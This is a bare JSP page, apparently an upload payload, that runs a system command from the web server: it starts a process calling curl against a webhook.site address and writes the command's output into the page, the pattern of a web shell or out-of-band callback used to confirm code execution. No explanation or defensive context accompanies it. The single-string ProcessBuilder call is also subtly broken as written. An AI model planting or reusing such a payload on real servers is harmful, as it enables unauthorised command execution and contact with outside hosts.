<%@ page import="java.io.*" %>
<%
ProcessBuilder pb = new ProcessBuilder("curl https://webhook.site/dee0c407-1982-4e24-a388-0f3e32637cca");
Process p = pb.start();
BufferedReader reader =
    new BufferedReader(new InputStreamReader(p.getInputStream()));
String line;
while ((line = reader.readLine()) != null) {
    out.println(line + "<br>");
}
%>
